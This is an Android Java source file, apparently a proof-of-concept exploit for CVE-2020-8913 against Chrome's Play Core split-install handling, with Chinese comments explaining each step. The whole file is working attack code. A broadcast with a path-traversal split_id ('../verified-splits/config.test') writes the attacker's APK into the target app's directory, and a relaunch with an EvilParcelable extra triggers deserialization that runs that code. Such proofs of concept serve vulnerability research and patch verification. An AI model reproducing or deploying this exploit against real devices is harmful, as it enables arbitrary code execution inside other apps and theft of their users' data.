package com.example.cve_2020_8913;


import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;

import java.util.ArrayList;
import java.util.Arrays;


public class MainActivity extends AppCompatActivity {
    public static final String APP = "com.android.chrome";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
        startActivity(launchIntent);

        new Handler().postDelayed(() -> {
            Intent split = new Intent();
            split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));//获取到自身App的apk文件所在位置
            split.putExtra("split_id", "../verified-splits/config.test");//通过目录穿越漏洞，将apk文件写入被攻击App的自身目录

            Bundle bundle = new Bundle();
            bundle.putInt("status", 3);
            bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));

            Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
            intent.setPackage(APP);
            intent.putExtra("session_state", bundle);
            sendBroadcast(intent);//通过注册的服务进行安装，加载攻击这App的Apk
        }, 3000);

        new Handler().postDelayed(() -> {
            startActivity(launchIntent.putExtra("x", new EvilParcelable()));//通过一个启动导出接口中的getExtra("x")触发反序列化，导致恶意代码执行
        }, 5000);
    }
}